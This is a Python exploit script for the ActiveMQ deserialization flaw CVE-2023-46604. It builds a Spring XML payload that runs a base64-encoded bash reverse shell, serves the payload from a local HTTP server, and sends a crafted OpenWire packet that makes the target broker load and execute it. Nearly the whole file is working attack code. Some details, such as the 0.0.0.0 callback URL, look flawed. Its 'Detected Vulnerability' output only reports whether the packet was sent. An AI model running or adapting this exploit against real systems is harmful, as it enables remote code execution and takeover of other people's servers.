import base64
import random
import string
import time
from http.server import HTTPServer, BaseHTTPRequestHandler
import socket
import struct
import argparse


class ActiveMQExploit:
    def __init__(self, target_url, http_host="0.0.0.0", http_port=8080):
        parsed_url = target_url.split(":")
        self.target_host = parsed_url[0]
        self.target_port = int(parsed_url[1]) if len(parsed_url) > 1 else 61616
        self.http_host = http_host
        self.http_port = http_port
        self.endpoint = "/" + "".join(random.choices(string.ascii_letters, k=12))
        self.payload = ""

    def generate_payload(self):
        reverse_shell = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
        encoded_shell = base64.b64encode(reverse_shell.encode()).decode()
        self.payload = f"""
<beans
    xmlns="http://www.springframework.org/schema/beans"
    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
    xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="exploit" class="java.lang.String">
        <property name="file" value="#{{''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('Nashorn').eval('eval(new java.lang.String(java.util.Base64.decoder.decode(&quot;{encoded_shell}&quot;)));')}}"/>
    </bean>
</beans>
"""

    def start_http_server(self):
        class RequestHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == self.server.endpoint:
                    self.send_response(200)
                    self.send_header("Content-Type", "application/xml")
                    self.end_headers()
                    self.wfile.write(self.server.payload.encode())
                    print("[*] Payload delivered.")
                else:
                    self.send_response(404)
                    self.end_headers()

        server = HTTPServer((self.http_host, self.http_port), RequestHandler)
        server.endpoint = self.endpoint
        server.payload = self.payload
        print(f"[*] HTTP server running on {self.http_host}:{self.http_port} with endpoint {self.endpoint}")
        server.serve_forever()

    def send_exploit(self):
        url = f"http://{self.http_host}:{self.http_port}{self.endpoint}"
        class_name = "org.springframework.context.support.FileSystemXmlApplicationContext"

        header = b"\x1f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
        class_msg = b"\x01" + struct.pack(">H", len(class_name)) + class_name.encode()
        url_msg = b"\x01" + struct.pack(">H", len(url)) + url.encode()
        payload = struct.pack(">I", len(header) + len(class_msg) + len(url_msg)) + header + class_msg + url_msg

        print("[*] Connecting to ActiveMQ...")
        try:
            with socket.create_connection((self.target_host, self.target_port)) as conn:
                print("[*] Sending exploit payload...")
                conn.sendall(payload)
                time.sleep(5)  # Wait for server to process the payload
                print("[*] Exploit payload sent successfully.")
                return True
        except Exception as e:
            print(f"[-] Failed to send exploit: {e}")
            return False

    def run(self):
        self.generate_payload()
        print("[*] Starting HTTP server to serve the payload...")
        from threading import Thread

        server_thread = Thread(target=self.start_http_server, daemon=True)
        server_thread.start()
        time.sleep(2)  # Allow server to start

        if self.send_exploit():
            print("Detected Vulnerability : True")
        else:
            print("Detected Vulnerability : False")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exploit script for ActiveMQ CVE-2023-46604.")
    parser.add_argument("-u", "--url", required=True, help="Target URL in the format 'host:port' (e.g., 'localhost:61616').")
    args = parser.parse_args()

    print("[*] Running ActiveMQ CVE-2023-46604 Exploit...")
    exploit = ActiveMQExploit(target_url=args.url)
    exploit.run()